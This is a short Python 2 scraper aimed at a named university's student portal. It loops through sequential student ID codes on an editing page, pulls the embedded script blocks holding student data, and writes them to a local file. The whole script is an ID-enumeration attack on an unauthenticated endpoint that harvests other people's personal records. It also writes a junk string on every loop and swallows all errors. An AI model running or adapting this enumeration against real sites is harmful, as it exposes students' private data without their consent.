# -*- coding: utf-8 -*-
import requests as rq
from bs4 import BeautifulSoup as bs
import json

#http://aulanet.umb.edu.co/aulanet_jh/edita_datos/editar_datos.php?codigo=96100709780
#1007396268
url = "http://aulanet.umb.edu.co/aulanet_jh/edita_datos/editar_datos.php?codigo="
codigo = 1007396267

with open("estudiantes.txt","wb") as line:
    line.write("gfkgfgdfjgg"+"\n");
    try:
        while True:
            line.write("gfkgfgdfjgg"+"\n")
            r = rq.get(url+str(codigo))
            text = bs(r.content, "html.parser")
            for datos in text.find_all("script",{"type":""} ):
                estudiante = datos.text
                nom = "nomalumno = ''" not in estudiante
                if "nomalumno = ''" in estudiante:
                    print "Nada"
                else:
                    line.write(estudiante+"\n")
                    
                    print str(estudiante)
                    
            codigo = codigo + 1
            
    except:
        pass
    

